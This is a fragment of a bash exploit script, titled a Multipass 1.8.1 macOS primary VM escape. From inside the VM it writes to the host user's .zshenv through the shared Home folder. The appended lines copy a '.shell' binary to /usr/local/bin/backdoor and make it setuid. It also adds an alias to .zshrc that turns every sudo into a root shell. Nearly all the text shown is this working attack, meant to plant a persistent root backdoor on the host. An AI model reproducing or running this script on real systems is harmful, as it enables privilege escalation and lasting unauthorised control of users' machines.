...
echo " /|*****************************************|"
echo "| |                                         |"  
echo "| |  Multipass i1.8.1+mac Primary VM escape |"
...
if [[ -f /home/ubuntu/Home/.zshenv ]] 
then 
	echo "[+] .zshenv exists on your host OS. "
        echo "    Patching .zshenv with payload " 
            if grep -q 'cp .shell /usr/local/bin/backdoor > /dev/null 2>&1' /home/ubuntu/Home/.zshenv; then
            echo "[-] Host .zshenv already patched ! " 
            exit 0  
	    fi
        echo 'cp .shell /usr/local/bin/backdoor > /dev/null 2>&1' >> /home/ubuntu/Home/.zshenv 
        echo 'chmod +s /usr/local/bin/backdoor > /dev/null 2>&1' >> /home/ubuntu/Home/.zshenv 
            if grep -q 'alias sudo="sudo -s"' /home/ubuntu/Home/.zshrc; then
            echo "[-] Host .zshrc already patched ! "
            exit 0
	    fi  
        echo 'alias sudo="sudo -s"' >> /home/ubuntu/Home/.zshrc
